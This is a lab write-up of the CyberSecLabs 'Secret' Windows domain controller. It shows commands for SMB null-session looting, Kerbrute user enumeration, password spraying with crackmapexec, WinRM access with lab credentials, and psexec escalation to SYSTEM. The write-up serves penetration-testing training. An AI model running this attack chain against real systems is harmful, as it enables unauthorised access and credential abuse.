---
description: https://www.cyberseclabs.co.uk/labs/info/Secret/
---

# Secret

![](<../../../.gitbook/assets/image (542).png>)

## Nmap

Started with a simple base scan on all ports. `nmap` was aborting early due to ping probes not responding so I used the `-Pn` switch to bypass host discovery.

```
nmap 172.31.1.4 -p- -Pn

PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49678/tcp open  unknown
49700/tcp open  unknown
```

## SMB

As usual I check SMB with null authentication to see if we have any quick potential vectors for the initial foothold.

![](<../../../.gitbook/assets/image (544) (1).png>)

We are able to read the shares with `smbclient` and then able to connect to the share 'Office\_share' without any valid credentials.

Running the `dir` command reveals we have a fair few directories.

![](<../../../.gitbook/assets/image (545).png>)

I will use `smbget` to recusively download all files which will also output which files are actually downloaded which makes sifting through multiple directories easy.

```
smbget -R smb://172.31.1.4/Office_Share
```

![](<../../../.gitbook/assets/image (546) (1).png>)

Reading the contents of the file for Default\_Password.txt shows the value of 'SecretOrg!'.

The directories we downloaded are named after potential users on the system.

![](<../../../.gitbook/assets/image (547) (1).png>)

This combined with the password value we have discovered could lead to our initial foothold. We should take one of the names and attempt to enumerate the username naming convention. I have created a 'users' file with variations of popular naming conventions.

![](<../../../.gitbook/assets/image (548).png>)

## Kerberos

We can now try `Kerbrute` against the server with this information to see if we get any hits with our mix of usernames. Before we do we need to find the domain name.

As port 3389 is open we can run `nmap` against it with the `-sC` switch for default scripts. This should enumerate the domain name for us.

```
nmap 172.31.1.4 -p 3389 -sC -Pn

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
| rdp-ntlm-info: 
|   Target_Name: SECRET
|   NetBIOS_Domain_Name: SECRET
|   NetBIOS_Computer_Name: SECRET-DC
|   DNS_Domain_Name: SECRET.org
|   DNS_Computer_Name: SECRET-DC.SECRET.org
|   DNS_Tree_Name: SECRET.org
|   Product_Version: 10.0.17763
|_  System_Time: 2020-12-14T19:48:25+00:00
| ssl-cert: Subject: commonName=SECRET-DC.SECRET.org
| Not valid before: 2020-12-13T18:10:36
|_Not valid after:  2021-06-14T18:10:36
|_ssl-date: 2020-12-14T19:48:25+00:00; 0s from scanner time.
```

Now that we have the domain name of 'SECRET.org' we can now run `Kerbrute` to hopefully find any potential usernames.

```
./kerbrute userenum /home/kali/secret/users -d secret.org --dc 172.31.1.4
```

![](<../../../.gitbook/assets/image (549).png>)

{% hint style="info" %}
When running Kerbrute I will add the Administrator and Guest accounts to the usersfile as these accounts normally exist and are a good way to test the returned results are accurate.
{% endhint %}

We see we have the user 'BDover@secret.org'. Now we know the naming convention we can take our usernames and add this variation of known users to the list.

* BDover
* JCakes
* KCurtis
* LFrank

We now run `Kerbrute` again.

![](<../../../.gitbook/assets/image (550).png>)

All users names are valid and we have the password of 'SecretOrg!' we discovered earlier. We can try spraying this password against the usernames to see if we get a hit.

We can use `crackmapexec` to attempt authentication against SMB.

```
crackmapexec smb 172.31.1.4 -u /home/kali/secret/users -p SecretOrg!
```

![](<../../../.gitbook/assets/image (551).png>)

## Initial Foothold

The credentials `JCakes:SecretOrg!` appear to be valid. We can use these credentials against WinRM as port 5985 is open. We can use `Evil-WinRM` for this.

{% embed url="https://github.com/Hackplayers/evil-winrm" %}

```
evil-winrm -u JCakes -p SecretOrg! -i 172.31.1.4
```

![](<../../../.gitbook/assets/image (552).png>)

Looking at `whoami /all` we have nothing too interesting.

![](<../../../.gitbook/assets/image (553).png>)

## Privilege Escalation

I will upload `winPEAS.exe` as per normal procedure to hopefully identify any obvious escalation vectors.

![](<../../../.gitbook/assets/image (554) (1).png>)

Some minutes later we have information regarding AutoLogon credentials.

![](<../../../.gitbook/assets/image (555).png>)

winPEAS has found the following credentials: `secret:vF4$x9#z:-eT~Fy`

We can then try these credentials against WinRM and SMB.

![](<../../../.gitbook/assets/image (556).png>)

We can also spray the password against known user accounts.

![](<../../../.gitbook/assets/image (557).png>)

I then sprayed the password again with crackmapexec except this time I defined the authentication protocol as WinRM.

```
crackmapexec winrm 172.31.1.4 -u /home/kali/secret/users -p 'vF4$x9#z:-eT~Fy'
```

![](<../../../.gitbook/assets/image (558) (1).png>)

Checking the `whoami /all` command we see we have a tonne of privileges and also are a member of the Administrators group.

![](../../../.gitbook/assets/Screenshot\_2020-12-14\_17-06-16.png)

We are not system however, we should attempt to escalate to SYSTEM where possible. We can try Impacket's psexec.py to see if we can spawn a shell as SYSTEM.

```
sudo python2 psexec.py secret.org/bdover:'vF4$x9#z:-eT~Fy'@172.31.1.4
```
